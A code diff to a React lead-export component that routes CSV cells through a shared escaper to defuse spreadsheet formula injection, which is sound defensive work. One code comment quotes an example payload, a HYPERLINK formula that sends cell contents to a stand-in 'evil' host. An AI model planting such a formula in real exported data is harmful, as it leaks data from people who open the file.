@@ -2,6 +2,7 @@
 
 import { useState, useTransition } from 'react';
 import { useConfirm } from '@/components/ui/ConfirmProvider';
+import { escapeCsvCell } from '@/lib/csv';
 
 interface Lead {
   id: string;
@@ -49,7 +50,12 @@ function exportCSV(leads: Lead[]) {
     l.note ?? '',
     new Date(l.captured_at ?? l.created_at).toLocaleDateString(),
   ]);
-  const csv = [headers, ...rows].map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
+  // Use the shared escaper, not a local one. Lead names/companies/roles arrive
+  // from attendees (a scanned registration, or booth-typed input), so a value
+  // like =HYPERLINK("http://evil/?"&A1) would otherwise execute as a formula in
+  // Excel/Sheets when the exhibitor opens this file. escapeCsvCell defuses that
+  // and handles quoting; there must be exactly one implementation.
+  const csv = [headers, ...rows].map(r => r.map(escapeCsvCell).join(',')).join('\r\n');
   const blob = new Blob([csv], { type: 'text/csv' });
   const url  = URL.createObjectURL(blob);
   const a = document.createElement('a');
